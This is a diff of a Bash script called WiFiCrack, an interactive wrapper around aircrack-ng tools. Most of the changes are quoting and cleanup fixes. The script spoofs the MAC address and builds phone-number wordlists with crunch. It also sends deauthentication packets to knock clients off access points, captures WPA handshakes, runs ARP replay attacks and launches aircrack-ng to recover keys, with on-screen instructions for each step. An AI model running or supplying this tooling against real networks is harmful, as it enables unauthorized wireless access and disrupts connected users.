@@ -7,7 +7,7 @@ echo "----------------------- WiFiCrack HELP -----------------------
 1 --> Sets the selected WLAN interface in monitor mode and begins the cracking process.
 e --> Enables monitor mode for selected WLAN interface.
 d --> Disables monitor mode for selected WLAN interface.
-w --> Generate cell phone number wordlist.
+w --> Generate cell phone number wordlist. 
 h --> Shows this text.
 v --> Calls nmcli and displays nearby Access Points.
 s --> Shows technical info of the current WLAN interface.
@@ -24,7 +24,7 @@ XTERM=$(command -v xterm)
 
 if [[ -z "$AIRCRACK" ]] || [[ -z "$NMCLI" ]] || [[ -z "$MACCHANGER" ]] || [[ -z "$XTERM" ]]; then
 
-    DISTRO=$(for f in $(find /etc -type f -maxdepth 1 \( ! -wholename /etc/os-release ! -wholename /etc/lsb-release -wholename /etc/\*release -o -wholename /etc/\*version \) 2> /dev/null); do echo ${f:5:${#f}-13}; done;)
+    DISTRO=$(for f in $(find /etc -type f -maxdepth 1 \( ! -wholename /etc/os-release ! -wholename /etc/lsb-release -wholename /etc/\*release -o -wholename /etc/\*version \) 2> /dev/null); do echo "${f:5:${#f}-13}"; done;)
     
     if [[ -z "$AIRCRACK" ]]; then
         AIRCRACK="aircrack-ng"
@@ -76,7 +76,7 @@ if [[ -z "$AIRCRACK" ]] || [[ -z "$NMCLI" ]] || [[ -z "$MACCHANGER" ]] || [[ -z 
             INSTALL="dnf -y install "
             ;;
         * )
-            echo -ne "Unable to determine Linux Distribution! Install "$AIRCRACK" "$NMCLI" "$MACCHANGER" "$XTERM" manually."
+            echo -ne "Unable to determine Linux Distribution! Install \"$AIRCRACK\" \"$NMCLI\" \"$MACCHANGER\" \"$XTERM\" manually."
             exit 1
     esac
 
@@ -100,17 +100,17 @@ echo
 read -p "Enter Phone Number digit length : " LENGTH
 read -p "Enter Cell Phone prefix : " PREFIX
 read -p "Enter number of recurring digits (Press Enter to skip) : " RECURRING
-TMP_1=$(echo ${#PREFIX})
-TMP_2=$(expr $LENGTH - $TMP_1 + 1)
+TMP_1=${#PREFIX}
+TMP_2=$(("$LENGTH" - "$TMP_1" + 1))
 TMP_3=$(seq -s% "$TMP_2" | tr -d '[:digit:]')
-TMP_4=$(echo $TMP_3 | sed 's/%/X/g')
+TMP_4=$(echo "$TMP_3" | sed 's/%/X/g')
 SUFFIX=".lst"
 if [[ -z "$RECURRING" ]]; then
-    crunch $LENGTH $LENGTH -t $PREFIX$TMP_3 -o $PREFIX$TMP_4$SUFFIX
+    crunch "$LENGTH" "$LENGTH" -t "$PREFIX""$TMP_3" -o "$PREFIX""$TMP_4""$SUFFIX"
 else
-    crunch $LENGTH $LENGTH -d $RECURRING -t $PREFIX$TMP_3 -o $PREFIX$TMP_4$SUFFIX
+    crunch "$LENGTH" "$LENGTH" -d "$RECURRING" -t "$PREFIX""$TMP_3" -o "$PREFIX""$TMP_4""$SUFFIX"
 fi
-GEN=$(echo $?)
+GEN=$?
 if [[ "$GEN" -eq 0 ]]; then
     echo "Wordlist successfully generated."
     read -p "Press Enter to go back..." KEY
@@ -151,18 +151,18 @@ fi
 cell_phones_wl
 }
 function test_injection {
-echo
+clear
 TRY=y
 if [[ -n "$STATE" ]]; then
     echo "Testing injection for $IFACE"
-    RANGE=$(aireplay-ng -9 $IFACE | grep "Found 0 APs")
+    RANGE=$(aireplay-ng -9 "$IFACE" | grep "Found 0 APs")
     if [[ -n "$RANGE" ]]; then
         while [[ "$TRY" = [Yy] ]]; 
         do
-            RANGE=$(aireplay-ng -9 $IFACE | grep "Found 0 APs")
-            WORKS=$(aireplay-ng -9 $IFACE | grep "Injection is working!")
+            RANGE=$(aireplay-ng -9 "$IFACE" | grep "Found 0 APs")
+            WORKS=$(aireplay-ng -9 "$IFACE" | grep "Injection is working!")
             if [[ -z "$RANGE" ]]; then
-                WORKS=$(aireplay-ng -9 $IFACE | grep "Injection is working!")
+                WORKS=$(aireplay-ng -9 "$IFACE" | grep "Injection is working!")
                 if [[ -n "$WORKS" ]]; then
                     echo "WLAN interface ($IFACE) supports injection."
                     echo
@@ -203,7 +203,7 @@ if [[ -n "$STATE" ]]; then
             fi
         done
     else
-        WORKS=$(aireplay-ng -9 $IFACE | grep "Injection is working!")
+        WORKS=$(aireplay-ng -9 "$IFACE" | grep "Injection is working!")
         if [[ -n "$WORKS" ]]; then
             echo "WLAN interface ($IFACE) supports injection."
             echo
@@ -308,9 +308,9 @@ else
         break
     done
     read -r AP <<< "$CHOICE)"
-    BSSID=$(echo $AP | awk -F ':' '{print $3} {print $4} {print $5} {print $6} {print $7} {print $8}' | sed 's/\\/\:/g' | xargs | sed 's/ //g')
-    CHAN=$(echo $AP | awk -F ':' '{print $2}')
-    ESSID=$(echo $AP | awk -F ':' '{print $1}')
+    BSSID=$(echo "$AP" | awk -F ':' '{print $3} {print $4} {print $5} {print $6} {print $7} {print $8}' | sed 's/\\/\:/g' | xargs | sed 's/ //g')
+    CHAN=$(echo "$AP" | awk -F ':' '{print $2}')
+    ESSID=$(echo "$AP" | awk -F ':' '{print $1}')
     #ESSID=$(tr -d ' ' <<< $ESSID)
 fi
 }
@@ -318,20 +318,22 @@ function wpa_attacks {
 clear
 echo "------------ WPA1/2 4-Way Handshake Capture ------------"
 read -p "Press Enter to continue ? " KEY
-IFACE=$(ls /sys/class/net | grep $IFACE)
-ESSID=$(tr -d ' ' <<< $ESSID)
-AIRODUMP="airodump-ng --bssid "$BSSID" -c "$CHAN" -w "$ESSID" "$IFACE""
-env -u SESSION_MANAGER xterm -hold -e $AIRODUMP &
+IFACE=$(ls /sys/class/net | grep "$IFACE")
+ESSID=$(tr -d ' ' <<< "$ESSID")
+AIRODUMP="airodump-ng --bssid $BSSID -c $CHAN -w $ESSID $IFACE"
+env -u SESSION_MANAGER xterm -hold -e "$AIRODUMP" &
 echo "You need to capture a 4-Way Handshake and then brute-force the .cap file against a wordlist. 
 You capture a 4-Way Handshake by forcing an already connected client to de-auth, the client will automatically try to reconnect and in the process will share his/her 4-Way Handshake with all the listening parties. ie. You and the Access Point (Modem/Router). Client MAC is displayed under the STATION collumn in the airodump-ng window. If no clients are connected you cannot capture a Handshake."
 echo
-
+echo
+echo "When a client you want to de-auth shows up in the airodump-ng window. Press Space to pause the output, select the MAC address and Press Ctrl + Shift + C to copy it. Then paste it here and press Space on the airodump-ng window to continue the output."
+echo
 read -p "Are any clients connected ? [yn] " ANSWER
 if [[ "$ANSWER" = [Yy] ]]; then
     ASN=y
     while [[ "$ASN" != [Nn] ]]; do
         read -p "Enter Client MAC you wish to de-auth and press enter. : " CLIENT
-        read -p "How many times ?" TIMES
+        read -p "How many times ? " TIMES
         aireplay-ng -0 "$TIMES" -a "$BSSID" -c "$CLIENT" "$IFACE"
         read -p "Try again with same settings [yn] " ASN
         while [[ "$ASN" = [Yy] ]]; do
@@ -341,16 +343,14 @@ if [[ "$ANSWER" = [Yy] ]]; then
     done
 fi
 echo
+kill "$(pgrep "xterm -hold -e airodump-ng")"
 echo "You need the $ESSID.cap file in order to feed it to aircrack-ng and brute-force the password. Consider keeping it."
 echo
 read -p "Press Enter to continue..." KEY
 clean_up
 echo
 read -p "Press Enter to go back " KEY
-PID=$(ps aux | grep "xterm -hold -e airodump-ng" | grep -v grep | awk -F ' ' '{print $2}')
-kill $PID
 unset ASN
-unset PID
 unset ESSID
 unset AIRODUMP
 unset CHAN
@@ -362,13 +362,13 @@ echo
 read -p "Clean up $ESSID.cap, $ESSID.csv, $ESSID.netxml and replay files ? [yn] " ASR
 read -p "Keep $ESSID.cap file ? [yn] " ANS
 if [[ "$ASR" = [Yy] && "$ANS" = [Yy] ]]; then
-    rm -f $ESSID*.netxml
-    rm -f $ESSID*.csv
+    rm -f "$ESSID"*.netxml
+    rm -f "$ESSID"*.csv
     rm -f replay*.cap
 elif [[ "$ASR" = [Yy] && "$ANS" = [Nn] ]]; then
-    rm -f $ESSID*.netxml
-    rm -f $ESSID*.cap
-    rm -f $ESSID*.csv
+    rm -f "$ESSID"*.netxml
+    rm -f "$ESSID"*.cap
+    rm -f "$ESSID"*.csv
     rm -f replay*.cap
 elif [[ "$ASR" = [Nn] ]]; then
     :
@@ -385,32 +385,35 @@ echo
 echo "Setting M/M on $IFACE"
 set_mon >> /dev/null
 echo
-echo "Initiating packet capture"
-AIRODUMP="airodump-ng --bssid "$BSSID" -c "$CHAN" -w "$ESSID" "$IFACE""
-ESSID=$(tr -d ' ' <<< $ESSID)
+ESSID=$(tr -d ' ' <<< "$ESSID")
+AIRODUMP="airodump-ng --bssid $BSSID -c $CHAN -w $ESSID $IFACE"
 echo
-env -u SESSION_MANAGER xterm -hold -e $AIRODUMP &
 COUNTER=3
 until [[ "$COUNTER" -lt 1 ]]; do
+    clear
     echo "Attempting to Associate to $ESSID... $COUNTER"
     let COUNTER-=1
-    SUCCESS=$(aireplay-ng -1 0 -a "$BSSID" -h "$NEWMAC" "$IFACE" | grep "Association successful :-) (AID: 1)")
-    if [[ -n $SUCCESS ]]; then
+    aireplay-ng -1 0 -a "$BSSID" -h "$NEWMAC" "$IFACE" #| grep "Association successful :-) (AID: 1)"
+    SUCCESS=$?
+    if [[ "$SUCCESS" = 0 ]]; then
         echo "Association successful!"
         echo "Initiating ARP Replay attack..."
         aireplay-ng -3 -b "$BSSID" -h "$NEWMAC" "$IFACE" &>/dev/null &
+        echo "Initiating packet capture"
+        env -u SESSION_MANAGER xterm -hold -e "$AIRODUMP" &
         echo
         break
     else
         echo "Association failed, trying again..."
     fi
 done
-if [[ -z "$SUCCESS" ]]; then
+if [[ "$SUCCESS" != 0 ]]; then
     echo "Unable to Associate, make sure your wlan interface supports injection."
     read -p "Test injection now ? [yn] " INJ
     if [[ "$INJ" = [Yy] ]]; then
         test_injection
     fi
+    kill "$(pgrep "xterm -hold -e airodump-ng")"
     echo
     echo "In some cases rebooting your computer usually fixes the Association failure."
     echo
@@ -427,15 +430,15 @@ echo
 if [[ "$ANS" = [Yy] ]]; then
     read -p "Try cracking $ESSID now ? [yn] : " ANSWER
     if [[ "$ANSWER" = [Yy] ]]; then
-        readarray -t FILES < <(find `pwd` -name "*.cap")
+        readarray -t FILES < <(find "$(pwd)" -name "*.cap")
         if [[ -z "$FILES" ]]; then
             echo "No .cap files found."
             echo
-            read -p "Press Enter to go back" KEY
             unset ESSID
             unset AIRODUMP
             unset CHAN
             unset BSSID
+            read -p "Press Enter to go back" KEY
             go_back
         else
             echo "Select a .cap file to crack"
@@ -445,22 +448,16 @@ if [[ "$ANS" = [Yy] ]]; then
             done
             read -r CAP <<< "$CHOICE"
         fi
-        echo $CAP
-        COMMAND="aircrack-ng "$CAP""
-        env -u SESSION_MANAGER xterm -hold -e $COMMAND &
+        echo "You picked : $CAP"
+        COMMAND="aircrack-ng $CAP"
+        env -u SESSION_MANAGER xterm -hold -e "$COMMAND" &
         clear
         echo "Wait for aircrack-ng to finish. The password will be in this form (XX:XX:XX:XX:XX:XX)."
         echo
         read -p "Press Enter to clean up files and go back..." KEY
-        PID=$(ps aux | grep aireplay-ng | grep -v grep | awk -F ' ' '{print $2}')
-        kill $PID
-        unset PID
-        PID=$(ps aux | grep "xterm -hold -e airodump-ng" | grep -v grep | awk -F ' ' '{print $2}')
-        kill $PID
-        unset PID
-        PID=$(ps aux | grep "xterm -hold -e aircrack-ng" | grep -v grep | awk -F ' ' '{print $2}')
-        kill $PID
-        unset PID
+        kill "$(pgrep aireplay-ng)"
+        kill "$(pgrep "xterm -hold -e airodump-ng")"
+        kill "$(pgrep "xterm -hold -e aircrack-ng")"
         clean_up
         unset ESSID
         unset AIRODUMP
@@ -471,16 +468,12 @@ if [[ "$ANS" = [Yy] ]]; then
         unset CHOICE
         unset INJ
         unset ANSWER
+        read -p "Press Enter to go back" KEY
         go_back
     else
-        PID=$(ps aux | grep aireplay-ng | grep -v grep | awk -F ' ' '{print $2}')
-        kill $PID
-        unset PID
-        PID=$(ps aux | grep "xterm -hold -e airodump-ng" | grep -v grep | awk -F ' ' '{print $2}')
-        kill $PID
-        unset PID
+        kill "$(pgrep aireplay-ng)"
+        kill "$(pgrep "xterm -hold -e airodump-ng")"
         clean_up
-        read -p "Press Enter to exit and go back. " KEY
         unset ESSID
         unset AIRODUMP
         unset CHAN
@@ -490,22 +483,19 @@ if [[ "$ANS" = [Yy] ]]; then
         unset CHOICE
         unset INJ
         unset ANSWER
+        read -p "Press Enter to exit and go back. " KEY
         go_back
     fi
 elif [[ "$ANS" = [Nn] ]]; then
     echo "Consider using Fragmentation attack method."
-    #PID=$(ps aux | grep aireplay-ng | grep -v grep | awk -F ' ' '{print $2}')
-    #kill $PID
-    #unset PID
-    PID=$(ps aux | grep "xterm -hold -e airodump-ng" | grep -v grep | awk -F ' ' '{print $2}')
-    kill $PID
-    unset PID
+    #kill "$(pgrep aireplay-ng)"
+    kill "$(pgrep "xterm -hold -e airodump-ng")"
     clean_up
-    read -p "Press Enter to exit and go back. " KEY
     unset ESSID
     unset AIRODUMP
     unset CHAN
     unset BSSID
+    read -p "Press Enter to exit and go back. " KEY
     go_back
 fi
 }
@@ -515,9 +505,9 @@ echo "-------------- Select Attack Method --------------"
 echo
 echo "You picked ($AP"
 echo
-echo "AP Name: "$ESSID
-echo "AP Channel: "$CHAN
-echo "AP MAC: "$BSSID
+echo "AP Name: ""$ESSID"
+echo "AP Channel: ""$CHAN"
+echo "AP MAC: ""$BSSID"
 echo
 PROMPT="Select : "
 echo "1) ARP Replay attack"
@@ -555,11 +545,12 @@ do
 done
 }
 function show_info {
-ADDR=$(iw $IFACE info | grep addr | awk -F ' ' '{print $2}')
-TYPE=$(iw $IFACE info | grep \t\y\p\e | awk -F ' ' '{print $2}')
-TXPOWER==$(iw $IFACE info | grep txpower | awk -F ' ' '{print $2}{print $3}' | xargs)
-NAME=$(iw $IFACE info | grep Interface | awk -F ' ' '{print $2}')
-CHANNEL=$(iw $IFACE info | grep channel | awk -F ' ' '{print $2}{print $3}{print $4}' | xargs | sed 's/,//g')
+clear
+ADDR=$(iw "$IFACE" info | grep addr | awk -F ' ' '{print $2}')
+TYPE=$(iw "$IFACE" info | grep \t\y\p\e | awk -F ' ' '{print $2}')
+TXPOWER=$(iw "$IFACE" info | grep txpower | awk -F ' ' '{print $2}{print $3}' | xargs)
+NAME=$(iw "$IFACE" info | grep Interface | awk -F ' ' '{print $2}')
+CHANNEL=$(iw "$IFACE" info | grep channel | awk -F ' ' '{print $2}{print $3}{print $4}' | xargs | sed 's/,//g')
 echo "----------------------- WiFi Card Info -----------------------"
 echo
 echo "Name                          : $NAME"
@@ -583,50 +574,68 @@ else
     echo "Disabling Monitor Mode for $IFACE..."
     echo
     echo "Bringing $IFACE down..."
-    IFACE=$(ls /sys/class/net | grep $IFACE)
-    ifconfig $IFACE down >> /dev/null
+    IFACE=$(ls /sys/class/net | grep "$IFACE")
+    ifconfig "$IFACE" down >> /dev/null
     echo "Reverting MAC address to factory default..."
-    macchanger -p $IFACE  >> /dev/null
+    macchanger -p "$IFACE"  >> /dev/null
     echo "Bringing $IFACE up..."
-    ifconfig $IFACE up >> /dev/null
+    ifconfig "$IFACE" up >> /dev/null
     echo "Disabling monitor mode for $IFACE..."
-    airmon-ng stop $IFACE >> /dev/null
+    airmon-ng stop "$IFACE" >> /dev/null
     echo "$IFACE is no longer in monitor mode."
     unset STATE
     sleep 2
-    IFACE=$(sed 's/mon//g' <<< $IFACE)
+    IFACE=$(sed 's/mon//g' <<< "$IFACE")
 fi
 }
 function set_mon {
 if [[ -z "$STATE" ]]; then
+    LIST="1 2 3 4 5 6 7 8 9 10 11 12 13 14 131 132 132 133 133 134 134 135 136 136 137 137 138 138 36 40 44 48 52 56 60 64 100 104 108 112 116 120 124 128 132 136 140 149 153 157 161 165"
     echo
     echo "Setting $IFACE in Monitor Mode..."
     echo
     echo "Creating new interface..."
-    airmon-ng start $IFACE >> /dev/null
-    IFACE=$(ls /sys/class/net | grep $IFACE)
+    read -p "Set Channel or (Press Enter to skip) : " REPLY
+    if [[ "$LIST" =~ (^|[[:space:]])"$REPLY"($|[[:space:]]) ]]; then 
+        airmon-ng start "$IFACE" "$REPLY" >> /dev/null
+    elif [[ ! "$LIST" =~ (^|[[:space:]])"$REPLY"($|[[:space:]]) && "$REPLY" = "" ]]; then 
+        airmon-ng start "$IFACE" >> /dev/null
+    else
+        echo "Invalid Channel \"$REPLY\" entered. "
+        read -p "Retry ? [yn] " ASK
+        if [[ "$ASK" = [Yy] && "$REPLY" != "" ]]; then
+            unset REPLY
+            unset ASK
+            unset LIST
+            set_mon
+        fi
+    fi
+    IFACE=$(ls /sys/class/net | grep "$IFACE")
     echo "Bringing $IFACE down..."
-    ifconfig $IFACE down >> /dev/null
+    ifconfig "$IFACE" down >> /dev/null
     echo "Changing MAC address for $IFACE"
-    macchanger -m 00:11:22:33:44:55 $IFACE >> /dev/null
+    macchanger -m 00:11:22:33:44:55 "$IFACE" >> /dev/null
     echo "Bringing $IFACE up..."
-    ifconfig $IFACE up >> /dev/null
-    NEWMAC=$(iw $IFACE info | grep addr | awk '{print $2}')
-    STATE=$(echo $IFACE | grep mon)
+    ifconfig "$IFACE" up >> /dev/null
+    NEWMAC=$(iw "$IFACE" info | grep addr | awk '{print $2}')
+    STATE=$(echo "$IFACE" | grep mon)
     echo "$IFACE is in monitor mode and it's MAC address is: $NEWMAC"
+    unset REPLY
+    unset LIST
+    unset ASK
 else
     echo
     echo "$IFACE already in monitor mode."
-    NEWMAC=$(iw $IFACE info | grep addr | awk '{print $2}')
+    NEWMAC=$(iw "$IFACE" info | grep addr | awk '{print $2}')
     sleep 2
 fi
 }
 function go_back {
-    if [[ "$IFACENUM" -eq 1 ]]; then
-        single_interface
-    else
-        multiple_interfaces
-    fi
+if [[ "$IFACENUM" -eq 1 ]]; then
+    single_interface
+else
+    multiple_interfaces
+fi
 }
 function show_APs {
 clear
@@ -660,7 +669,11 @@ else
 fi
 echo "----------------------- WiFiCrack v0.5_beta -----------------------"
 echo "WLAN Interface : $IFACE"
-echo "Monitor Mode   : $MM" 
+if [[ "$MM" = "ON" ]]; then
+    echo "Monitor Mode   : >> $MM <<"
+else
+    echo "Monitor Mode   : $MM"  
+fi
 echo
 echo "1) Crack"
 echo "e) Enable <M/M>"
@@ -670,7 +683,7 @@ echo "h) View Help"
 echo "v) View APs"
 echo "s) Show Info"
 if [[ -n "$SWITCH" ]]; then
-    echo $SWITCH
+    echo "$SWITCH"
 fi
 echo "t) Test Injection         r) Verbose Test (faster)"
 echo "q) Abort!"
@@ -691,7 +704,7 @@ read -r IFACE <<< "$CHOICE"
 function single_interface {
 STATE=$(ls /sys/class/net | grep mon)
 IFACE=$(ls /sys/class/net | grep wl)
-MAC=$(iw $IFACE info | grep addr | awk '{print $2}')
+#MAC=$(iw $IFACE info | grep addr | awk '{print $2}')
 menu
 while read -n1 CHAR
 do
@@ -732,7 +745,6 @@ do
             break
             ;;
         s )
-            clear
             show_info
             echo
             read -p "Press Enter to go back" KEY
@@ -740,7 +752,6 @@ do
             break
             ;;
         t )
-            clear
             test_injection
             read -p "Press Enter to go back" KEY
             single_interface
@@ -753,9 +764,9 @@ do
                 echo
                 set_mon >> /dev/null
                 FLG=1
-                aireplay-ng -9 $IFACE
+                aireplay-ng -9 "$IFACE"
             else
-                aireplay-ng -9 $IFACE
+                aireplay-ng -9 "$IFACE"
             fi
             if [[ "$FLG" = 1 ]]; then
                 echo "Unsetting Monitor mode on $IFACE..."
@@ -777,7 +788,7 @@ do
 done
 }
 function multiple_interfaces {
-STATE=$(echo $IFACE | grep mon)
+STATE=$(echo "$IFACE" | grep mon)
 menu
 while read -n1 CHAR
 do
@@ -818,7 +829,6 @@ do
             break
             ;;
         s )
-            clear
             show_info
             echo
             read -p "Press Enter to go back" KEY
@@ -826,7 +836,6 @@ do
             break
             ;;
         t )
-            clear
             test_injection
             read -p "Press Enter to go back" KEY
             multiple_interfaces
@@ -839,9 +848,9 @@ do
                 echo
                 set_mon >> /dev/null
                 FLG=1
-                aireplay-ng -9 $IFACE
+                aireplay-ng -9 "$IFACE"
             else
-                aireplay-ng -9 $IFACE
+                aireplay-ng -9 "$IFACE"
             fi
             if [[ "$FLG" = 1 ]]; then
                 echo "Unsetting Monitor mode on $IFACE..."
@@ -874,7 +883,7 @@ if [[ "$EUID" -ne 0 ]]; then
 fi
 }
 function check_wlan {
-IFACENUM=$(ls /sys/class/net/ | grep wl |  wc -l)
+IFACENUM=$(ls /sys/class/net/ | grep -c wl)
 if [[ "$IFACENUM" -gt 1 ]]; then
     echo "You have multiple wlan interfaces."
     list_ifaces
